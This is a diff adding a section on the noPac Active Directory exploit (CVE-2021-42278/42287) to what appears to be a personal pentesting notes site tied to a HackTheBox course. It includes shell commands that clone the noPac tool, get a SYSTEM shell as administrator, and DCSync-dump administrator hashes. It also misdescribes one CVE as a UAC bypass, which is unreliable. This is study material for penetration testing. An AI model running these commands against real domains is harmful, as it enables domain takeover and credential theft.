@@ -394,6 +394,30 @@ Refer to [cracking Kerberos Tickets](/cybersecurity/cryptography/algorithms/hash
 
 <hr class="sep-both">
 
+## AD Pentester CVE Notes ☠️
+
+<div class="row row-cols-lg-2"><div>
+
+#### noPac Exploit (SamAccountName Spoofing)
+
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+The noPac exploit is based on [CVE-2021-42278](https://nvd.nist.gov/vuln/detail/CVE-2021-42278) and [CVE-2021-42287](https://nvd.nist.gov/vuln/detail/CVE-2021-42287). The first one is used to bypass UAC while the second targets [PAC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/c38cc307-f3e6-4ed4-8c81-dc550d96223c).
+
+We need to change the `SamAccountName` a computer account to match the one of a domain controller `SamAccountName`. Any authenticated user can register up to `ms-DS-MachineAccountQuota` hosts, `10` by default.
+
+```shell!
+$ DEST="$HOME/tools/noPac"
+$ git clone -b "main" https://github.com/Ridter/noPac.git $DEST
+$ python3 $DEST/scanner.py domain/username:password -dc-ip IP -use-ldap # Test, get a TGT
+$ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 -shell --impersonate administrator -use-ldap # impersonate DC01
+$ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user domain/administrator # DCSync, Dump Hashes/Tickets
+```
+</div><div>
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
